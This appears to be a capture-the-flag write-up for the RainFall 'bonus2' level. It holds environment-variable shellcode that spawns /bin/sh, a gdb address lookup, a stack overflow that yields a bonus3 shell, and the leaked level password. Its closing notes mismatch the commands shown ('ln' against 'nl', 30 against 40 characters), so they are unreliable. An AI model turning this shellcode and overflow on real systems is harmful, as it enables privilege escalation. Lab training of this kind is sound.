# bonus2

```sh
➜  ~ ssh bonus2@127.0.0.1 -p 4242
      _____       _       ______    _ _
     |  __ \     (_)     |  ____|  | | |
     | |__) |__ _ _ _ __ | |__ __ _| | |
     |  _  /  _` | | '_ \|  __/ _` | | |
     | | \ \ (_| | | | | | | | (_| | | |
     |_|  \_\__,_|_|_| |_|_|  \__,_|_|_|

                 Good luck & Have fun

  To start, ssh with level0/level0 on 10.0.2.15:4242
bonus1@127.0.0.1's password:
  GCC stack protector support:            Enabled
  Strict user copy checks:                Disabled
  Restrict /dev/mem access:               Enabled
  Restrict /dev/kmem access:              Enabled
  grsecurity / PaX: No GRKERNSEC
  Kernel Heap Hardening: No KERNHEAP
 System-wide ASLR (kernel.randomize_va_space): Off (Setting: 0)
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      FILE
No RELRO        No canary found   NX disabled   No PIE          No RPATH   No RUNPATH   /home/user/bonus1/bonus1
bonus2@RainFall:~$
```



```sh
bonus2@RainFall:~$ export SHELLCODE=$(python -c 'import sys; sys.stdout.write("\x90"*2048 + "\x83\xc4\x18\x31\xc0\x31\xdb\xb0\x06\xcd\x80\x53\x68/tty\x68/dev\x89\xe3\x31\xc9\x66\xb9\x12\x27\xb0\x05\xcd\x80\x6a\x17\x58\x31\xdb\xcd\x80\x6a\x2e\x58\x53\xcd\x80\x31\xc0\x50\x68//sh\x68/bin\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80")')
bonus2@RainFall:~$ gdb ./bonus2 
GNU gdb (Ubuntu/Linaro 7.4-2012.04-0ubuntu2.1) 7.4-2012.04
Copyright (C) 2012 Free Software Foundation, Inc.
License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
This is free software: you are free to change and redistribute it.
There is NO WARRANTY, to the extent permitted by law.  Type "show copying"
and "show warranty" for details.
This GDB was configured as "i686-linux-gnu".
For bug reporting instructions, please see:
<http://bugs.launchpad.net/gdb-linaro/>...
Reading symbols from /home/user/bonus2/bonus2...(no debugging symbols found)...done.
(gdb) b main
Breakpoint 1 at 0x804852f
(gdb) r
Starting program: /home/user/bonus2/bonus2 

Breakpoint 1, 0x0804852f in main ()
(gdb) call (char *)getenv("SHELLCODE")
$1 = 0xbffff0cd "\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220"...
(gdb) quit
A debugging session is active.

	Inferior 1 [process 5214] will be killed.

Quit anyway? (y or n) EOF [assumed Y]
bonus2@RainFall:~$ LANG=nl ./bonus2 0123456789012345678901234567890123456789 01234567890123456789012$(echo -ne '\xed\xf0\xff\xbf')
Goedemiddag! 012345678901234567890123456789012345678901234567890123456789012����
$ whoami
bonus3
$ cat /home/user/bonus3/.pass
71d449df0f960b36e0055eb58c14d0f5d0ddc0b35328d657f91cf0df15910587
$ 
bonus2@RainFall:~$ su bonus3
Password: 
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      FILE
No RELRO        No canary found   NX enabled    No PIE          No RPATH   No RUNPATH   /home/user/bonus3/bonus3
bonus3@RainFall:~$ 
```

- The lang must be `ln`
- We overflow the buffer by passing 30 characters.
- We overflow the second buffer and passing the address of our SHELLCODE that run a shell.
